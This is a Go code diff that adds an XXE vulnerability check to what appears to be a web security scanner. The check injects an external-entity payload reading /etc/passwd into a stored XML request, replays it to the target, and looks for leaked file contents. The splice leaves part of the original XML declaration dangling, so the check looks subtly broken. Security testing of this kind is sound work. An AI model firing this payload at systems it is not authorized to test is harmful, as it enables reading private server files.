@@ -196,3 +196,78 @@ func scanRequest(w http.ResponseWriter, r *http.Request) {
 		"issues": issues,
 	})
 }
+
+func scanXXE(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "Only POST allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
+	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/scan-xxe/"), "/")
+	if len(parts) < 1 || parts[0] == "" {
+		http.Error(w, "Bad request ID", http.StatusBadRequest)
+		return
+	}
+
+	idStr := parts[0]
+	var id int
+	_, err := fmt.Sscanf(idStr, "%d", &id)
+	if err != nil {
+		http.Error(w, "Bad request ID", http.StatusBadRequest)
+		return
+	}
+
+	req, err := storage.GetRequestByID(id)
+	if err != nil || req == nil {
+		http.Error(w, "Not found", http.StatusNotFound)
+		return
+	}
+
+	bodyBytes, err := io.ReadAll(req.Body)
+	if err != nil {
+		http.Error(w, "Failed to read request body", http.StatusInternalServerError)
+		return
+	}
+	req.Body = io.NopCloser(bytes.NewReader(bodyBytes))
+	bodyStr := string(bodyBytes)
+
+	result := map[string]interface{}{
+		"id":         id,
+		"is_xml":     false,
+		"vulnerable": false,
+		"details":    "",
+	}
+
+	if strings.Contains(bodyStr, "<?xml") {
+		result["is_xml"] = true
+
+		xxePayload := `<!DOCTYPE foo [
+            <!ELEMENT foo ANY >
+            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+            <foo>&xxe;</foo>`
+
+		modifiedBody := strings.Replace(bodyStr, "<?xml", xxePayload, 1)
+
+		client := &http.Client{}
+		newReq, err := http.NewRequest(req.Method, req.URL.String(), strings.NewReader(modifiedBody))
+		if err == nil {
+			for k, v := range req.Header {
+				newReq.Header[k] = v
+			}
+
+			resp, err := client.Do(newReq)
+			if err == nil {
+				defer resp.Body.Close()
+				respBody, _ := io.ReadAll(resp.Body)
+
+				if strings.Contains(string(respBody), "root:") {
+					result["vulnerable"] = true
+					result["details"] = "System file /etc/passwd was leaked through XXE"
+				}
+			}
+		}
+	}
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(result)
+}
